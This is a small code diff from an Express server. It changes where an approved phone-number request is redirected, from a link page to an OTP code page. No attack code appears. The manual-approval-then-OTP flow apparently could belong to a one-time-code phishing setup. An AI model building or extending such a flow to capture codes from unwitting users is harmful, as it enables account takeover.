@@ -107,7 +107,7 @@ app.post('/submit-phone', (req, res) => {
 
 app.get('/check-phone/:id', (req, res) => {
   const result = phoneRequests[req.params.id];
-  if (result === true) return res.json({ redirect: 'link.html' });  // FIXED
+  if (result === true) return res.json({ redirect: 'code.html' });   // ✅ Redirect to OTP page
   if (result === false) return res.json({ approved: false });
   res.json({ approved: null });
 });
